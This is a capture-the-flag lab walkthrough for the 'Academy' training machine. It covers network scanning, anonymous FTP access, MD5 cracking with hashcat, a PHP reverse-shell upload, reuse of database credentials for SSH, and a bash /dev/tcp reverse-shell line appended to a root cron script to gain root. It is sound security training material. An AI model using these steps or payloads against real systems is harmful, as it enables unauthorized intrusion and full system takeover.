# CTF - Academy_TCM

## Scanning and enumeration

### 1. nmap scan to find the online host.

	─[whoami@parrot]─[~]
	└──╼ $sudo nmap -sn 192.168.100.1/24
	[sudo] password for whoami: 
	Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-30 11:17 PKT
	Nmap scan report for 192.168.100.1
	Host is up (0.036s latency).
	MAC Address: 10:C1:72:F7:3F:38 (Huawei Technologies)
	Nmap scan report for 192.168.100.5
	Host is up (0.18s latency).
	MAC Address: D0:B1:28:78:94:1F (Samsung Electronics)
	Nmap scan report for 192.168.100.50
	Host is up (0.17s latency).
	MAC Address: F6:A4:3B:3E:D6:EE (Unknown)
	Nmap scan report for 192.168.100.54
	Host is up (0.18s latency).
	MAC Address: 0A:CC:84:C1:E4:A8 (Unknown)
	Nmap scan report for 192.168.100.186
	Host is up (0.035s latency).
	MAC Address: 50:3E:AA:20:11:4B (Tp-link Technologies)
	Nmap scan report for 192.168.100.189
	Host is up (0.088s latency).
	MAC Address: 50:3E:AA:20:11:4B (Tp-link Technologies)
	Nmap scan report for 192.168.100.223
	Host is up (0.14s latency).
	MAC Address: 88:B4:A6:6D:84:1A (Motorola Mobility, a Lenovo Company)
	Nmap scan report for 192.168.100.182
	Host is up.
	Nmap done: 256 IP addresses (8 hosts up) scanned in 10.75 seconds

- Target IP = 192.168.100.189

### 2. Scanning the target through nmap 

Results = ./nmap-initial

- ports open : 21(ftp, v : vsftpd 3.0.3), 22(ssh, v : OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)), 80(http, Apache httpd 2.4.38 ((Debian)))
- OS = Linux(Debian)

### 3. Access FTP

- ftp port have a misconfiguration which allows access to the 'anonymous' username without any password.
- downloaded the file available named as 'note.txt' on the host machine.

		┌─[whoami@parrot]─[~/Desktop/task_machines/Academy]
		└──╼ $ftp $IP
		Connected to 192.168.100.189.
		220 (vsFTPd 3.0.3)
		Name (192.168.100.189:whoami): anonymous
		331 Please specify the password.
		Password:
		230 Login successful.
		Remote system type is UNIX.
		Using binary mode to transfer files.
		ftp> ls
		200 PORT command successful. Consider using PASV.
		150 Here comes the directory listing.
		-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
		226 Directory send OK.
		ftp> get note.txt
		local: note.txt remote: note.txt
		200 PORT command successful. Consider using PASV.
		150 Opening BINARY mode data connection for note.txt (776 bytes).
		226 Transfer complete.
		776 bytes received in 0.02 secs (43.6729 kB/s)
		ftp> pwd
		257 "/" is the current directory
		ftp> ls
		200 PORT command successful. Consider using PASV.
		150 Here comes the directory listing.
		-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
		226 Directory send OK.
		ftp> bye
		421 Timeout.

FILE = ./note.txt

### 4. Cracking Hash

- HASH = 'cd73502828457d15655bbd7a63fb0bc8'
- hash stored in a file = ./md5hash
- Type: md5
- using hashcat to crack
	
		sudo hashcat -a 0 -m 0 md5hash /home/whoami/Desktop/testctf/rockyou.txt 

- cracking process = ./hashprocess
- key-cracked = 'student'

### 5. exploring directory on the web server

- used gobuster utility

		sudo gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

- directories dicoverd: 2(/academy,/phpmyadmin)
Results = ./gobuster-directory

### 6. logging

- navigate to /academy directory and login using regno and cracked password.
- use the pin to verify


## Exploitation

### 1. upload a reevrse php shell payload

Paylaod = ./shell1.php

- Turn on your nc listener on a port u prefer.
- open the payload in a text editor and change the IP to your attacker machine ip and port number to any port you chose.(in my case 1234).
- Navigate to 'http://192.168.100.189/academy/my-profile.php' and upload the payload under upload new photo.
- As soon as you save changes you will get a reverse shell on your nc listener.
- run "python3 -c 'import pty;pty.spawn("/bin/bash")'" to make the shell more interacative


		┌─[whoami@parrot]─[~/Desktop/task_machines/Academy]
		└──╼ $sudo nc -lvnp 1234
		Listening on 0.0.0.0 1234
		Connection received on 192.168.100.189 58762
		Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
		 01:55:15 up 31 min,  0 users,  load average: 0.13, 0.05, 0.06
		USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
		uid=33(www-data) gid=33(www-data) groups=33(www-data)
		/bin/sh: 0: can't access tty; job control turned off
		$ python3 -c 'import pty;pty.spawn("/bin/bash")'
		www-data@academy:/$ whoami
		whoami
		www-data
		www-data@academy:/$ 

- The reverse shell gave you access to www-data user on the machine.

### privilege escalation

- Navigate to '/var/www/html/academy/includes'
- print out everything and match the 'passw' string to get the varaibles nmaes password and its value.

		www-data@academy:/var/www/html/academy$ cd includes
		cd includes
		www-data@academy:/var/www/html/academy/includes$ cat * | grep passw*
		cat * | grep passw*
		$mysql_password = "My_V3ryS3cur3_P4ss";
		$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");
		                               <li><a href="change-password.php">Change Password</a></li>
		www-data@academy:/var/www/html/academy/includes$ cat config.php
		cat config.php
		<?php
		$mysql_hostname = "localhost";
		$mysql_user = "grimmie";
		$mysql_password = "My_V3ryS3cur3_P4ss";
		$mysql_database = "onlinecourse";
		$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");
		?>

- username : grimmie
- password : My_V3ryS3cur3_P4ss

- ssh into the machine using the above credentials.
	
		┌─[whoami@parrot]─[~/Desktop/task_machines/Academy]
		└──╼ $ssh grimmie@192.168.100.189
		grimmie@192.168.100.189's password: 
		Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

		The programs included with the Debian GNU/Linux system are free software;
		the exact distribution terms for each program are described in the
		individual files in /usr/share/doc/*/copyright.

		Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
		permitted by applicable law.
		Last login: Mon Jan 31 04:28:58 2022 from 192.168.100.194
		grimmie@academy:~$ whoami
		grimmie
		grimmie@academy:~$ 
	
- print out the contents of 'backup.sh' in the home directory.

		grimmie@academy:~$ cat backup.sh 
		#!/bin/bash

		rm /tmp/backup.zip
		zip -r /tmp/backup.zip /var/www/html/academy/includes
		chmod 700 /tmp/backup.zip

- the script purpose is to backup the '/var/www/html/academy/includes' directory and give access to root only.
- wget pspy64 using the link : "https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64"
- make the file executable using 'chmod +x'
- execute pspy64 to reveal all the processes running on backgroud.

		2022/01/31 04:48:01 CMD: UID=0    PID=2198   | /bin/bash /home/grimmie/backup.sh 
		2022/01/31 04:48:01 CMD: UID=0    PID=2199   | /bin/bash /home/grimmie/backup.sh 

- backup.sh is running repeatedly each minute having root privileges.

- Add this line in backup.sh file to get access to the root shell:

		bash -c "bash -i >& /dev/tcp/192.168.100.182/443 0>&1"

- on another terminal run nc and listen to port 443 and get the root shell.

		┌─[whoami@parrot]─[~/Desktop/task_machines/Academy]
		└──╼ $sudo nc -lvnp 443
		[sudo] password for whoami: 
		Listening on 0.0.0.0 443
		Connection received on 192.168.100.189 42078
		bash: cannot set terminal process group (2240): Inappropriate ioctl for device
		bash: no job control in this shell
		root@academy:~# whoami
		whoami
		root
		root@academy:~# cat flag.txt
		cat flag.txt
		Congratz you rooted this box !
		Looks like this CMS isn't so secure...
		I hope you enjoyed it.
		If you had any issue please let us know in the course discord.

		Happy hacking !

